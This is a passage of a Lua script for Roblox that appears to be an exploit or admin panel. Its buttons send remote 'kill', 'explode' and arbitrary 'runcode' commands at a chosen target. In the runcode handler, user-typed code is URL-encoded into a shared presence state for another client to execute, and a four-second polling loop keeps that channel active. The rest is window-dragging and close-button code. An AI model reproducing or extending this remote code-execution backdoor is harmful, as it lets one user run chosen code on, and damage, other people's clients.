        _G.CurrentActiveEffect = "kill:" .. SelectedTarget .. ":" .. hash
        runLocalExplosionEffect(SelectedTarget); updatePresence()
        systemLog("Suite: Dispensing remote Kill matrix -> " .. SelectedTarget, "rgb(242, 63, 67)")
        task.delay(3, function() if _G.CurrentActiveEffect:sub(1,4) == "kill" then _G.CurrentActiveEffect = "none"; updatePresence() end end)
    end
end)

RemoteExplodeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
        _G.CurrentActiveEffect = "explode:" .. SelectedTarget .. ":" .. hash
        runLocalExplosionEffect(SelectedTarget); updatePresence()
        systemLog("Suite: Dispensing remote Explosion matrix -> " .. SelectedTarget, "rgb(230, 126, 34)")
        task.delay(3, function() if _G.CurrentActiveEffect:sub(1,7) == "explode" then _G.CurrentActiveEffect = "none"; updatePresence() end end)
    end
end)

RemoteExecuteCodeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and SelectedTarget ~= "none" and CodeBox.Text ~= "" then
        local hash = tostring(os.time() .. math.random(1,1000))
        local payloadClean = HttpService:UrlEncode(CodeBox.Text)
        
        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
        updatePresence()
        systemLog("Suite: Dispatched target code block execution sequence to -> " .. SelectedTarget, "rgb(35, 165, 90)")
        
        task.delay(4, function()
            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

local dragging, dragInput, dragStart, startPos
TitleBar.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true; dragStart = input.Position; startPos = WindowFrame.Position; input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end) end end)
TitleBar.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then local delta = input.Position - dragStart WindowFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
MinBtn.MouseButton1Click:Connect(function() minimized = not minimized; BodyFrame.Visible = not minimized; WindowFrame.Size = minimized and UDim2.new(0, 650, 0, 32) or UDim2.new(0, 680, 0, 440) MinBtn.Text = minimized and "🗖" or "—" end)

-- Fixed CloseBtn UI removal logic: safely handles CoreGui locking conditions
CloseBtn.MouseButton1Click:Connect(function() 
    running = false
    pcall(function() ScreenGui:Destroy() end) 
end)

-- --- INITIALIZATION LOOPS ---
updatePresence()
fetchData()
task.spawn(function() while task.wait(4) do if not running then break end updatePresence(); fetchData() end end)
